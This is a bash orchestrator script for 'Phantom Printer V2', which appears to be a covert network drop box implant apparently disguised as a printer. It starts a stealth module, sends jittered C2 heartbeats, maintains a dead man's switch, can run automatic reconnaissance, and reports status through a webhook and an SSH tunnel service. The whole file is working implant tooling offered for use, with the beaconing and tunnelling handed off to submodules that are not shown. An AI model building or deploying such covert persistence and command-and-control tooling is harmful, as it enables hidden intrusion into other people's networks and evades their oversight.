#!/bin/bash
#================================================================
# PHANTOM PRINTER V2 - MAIN ORCHESTRATOR
# Coordinates all modules and maintains operations
#================================================================

set -e

# Source configuration
CONFIG_FILE="/home/kali/dropbox-v2/config/dropbox.conf"
if [[ -f "$CONFIG_FILE" ]]; then
    source "$CONFIG_FILE"
fi

# Directories
DROPBOX_DIR="/home/kali/dropbox-v2"
MODULES_DIR="$DROPBOX_DIR/modules"
LOG_FILE="$DROPBOX_DIR/logs/main.log"

mkdir -p "$DROPBOX_DIR/logs"

# Defaults
DROPBOX_ID="${DROPBOX_ID:-phantom-001}"
N8N_WEBHOOK_URL="${N8N_WEBHOOK_URL:-}"
BEACON_INTERVAL="${BEACON_INTERVAL:-60}"
AUTO_RECON="${AUTO_RECON:-false}"

# Log function
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] [MAIN] $1"
    echo "$msg" | tee -a "$LOG_FILE"
    logger -t "dropbox-main" "$1"
}

# Send alert
send_alert() {
    if [[ -n "$N8N_WEBHOOK_URL" ]]; then
        "$MODULES_DIR/c2/c2.sh" alert "$1" "$2" "$3" 2>/dev/null || true
    fi
}

# Check if module exists and is executable
check_module() {
    local module="$1"
    if [[ -x "$module" ]]; then
        return 0
    else
        return 1
    fi
}

# Initialize all modules
initialize() {
    log "=== PHANTOM PRINTER V2 INITIALIZING ==="
    log "Dropbox ID: $DROPBOX_ID"
    
    # Check modules
    log "Checking modules..."
    
    local modules=(
        "$MODULES_DIR/stealth/stealth.sh"
        "$MODULES_DIR/c2/c2.sh"
        "$MODULES_DIR/recon/recon.sh"
        "$MODULES_DIR/opsec/opsec.sh"
    )
    
    for mod in "${modules[@]}"; do
        if check_module "$mod"; then
            log "  ✓ $(basename "$mod")"
        else
            log "  ✗ $(basename "$mod") - NOT FOUND"
        fi
    done
    
    # Enable stealth mode
    if check_module "$MODULES_DIR/stealth/stealth.sh"; then
        log "Enabling stealth mode..."
        "$MODULES_DIR/stealth/stealth.sh" enable || log "Stealth mode failed"
    fi
    
    # Send online alert
    send_alert "online" "info" "Phantom Printer V2 is now online"
    
    log "=== INITIALIZATION COMPLETE ==="
}

# Main operation loop
main_loop() {
    log "Starting main operation loop..."
    
    local c2_module="$MODULES_DIR/c2/c2.sh"
    local opsec_module="$MODULES_DIR/opsec/opsec.sh"
    local recon_module="$MODULES_DIR/recon/recon.sh"
    
    # Run initial recon if configured
    if [[ "$AUTO_RECON" == "true" ]] && check_module "$recon_module"; then
        log "Running initial reconnaissance..."
        "$recon_module" quick &
    fi
    
    # Main loop
    while true; do
        # Send heartbeat
        if check_module "$c2_module"; then
            "$c2_module" heartbeat 2>/dev/null || log "Heartbeat failed"
        fi
        
        # Update dead man's switch
        if check_module "$opsec_module"; then
            "$opsec_module" deadman-update 2>/dev/null || true
        fi
        
        # Calculate sleep with jitter
        local jitter=$((RANDOM % 30))
        local sleep_time=$((BEACON_INTERVAL + jitter))
        
        sleep "$sleep_time"
    done
}

# Shutdown gracefully
shutdown() {
    log "=== SHUTTING DOWN ==="
    
    # Send offline alert
    send_alert "offline" "info" "Phantom Printer V2 shutting down"
    
    # Disable stealth
    if check_module "$MODULES_DIR/stealth/stealth.sh"; then
        "$MODULES_DIR/stealth/stealth.sh" disable || true
    fi
    
    log "=== SHUTDOWN COMPLETE ==="
    exit 0
}

# Handle signals
trap shutdown SIGTERM SIGINT

# Status
show_status() {
    echo "=== PHANTOM PRINTER V2 STATUS ==="
    echo ""
    echo "Dropbox ID: $DROPBOX_ID"
    echo "Config: $CONFIG_FILE"
    echo ""
    
    echo "Services:"
    for svc in dropbox-main dropbox-stealth dropbox-ssh-tunnel dropbox-payloads; do
        status=$(systemctl is-active "$svc" 2>/dev/null || echo "not found")
        enabled=$(systemctl is-enabled "$svc" 2>/dev/null || echo "not found")
        echo "  $svc: $status (enabled: $enabled)"
    done
    echo ""
    
    echo "Modules:"
    for mod in stealth c2 recon opsec; do
        if [[ -x "$MODULES_DIR/$mod/$mod.sh" ]]; then
            echo "  ✓ $mod"
        else
            echo "  ✗ $mod"
        fi
    done
    echo ""
    
    echo "Network:"
    echo "  Hostname: $(hostname)"
    echo "  IP: $(ip -4 addr show scope global | grep inet | head -1 | awk '{print $2}')"
    echo "  MAC: $(ip link show | grep ether | head -1 | awk '{print $2}')"
    echo ""
    
    echo "C2:"
    echo "  Primary: ${C2_PRIMARY_HOST:-not set}:${C2_PRIMARY_PORT:-22}"
    echo "  n8n: ${N8N_WEBHOOK_URL:-not set}"
}

# Main
case "${1:-}" in
    start)
        initialize
        main_loop
        ;;
    stop)
        shutdown
        ;;
    status)
        show_status
        ;;
    init)
        initialize
        ;;
    *)
        echo "Usage: $0 {start|stop|status|init}"
        echo ""
        echo "Commands:"
        echo "  start   - Initialize and start main loop"
        echo "  stop    - Graceful shutdown"
        echo "  status  - Show system status"
        echo "  init    - Initialize only (no loop)"
        exit 1
        ;;
esac

exit 0
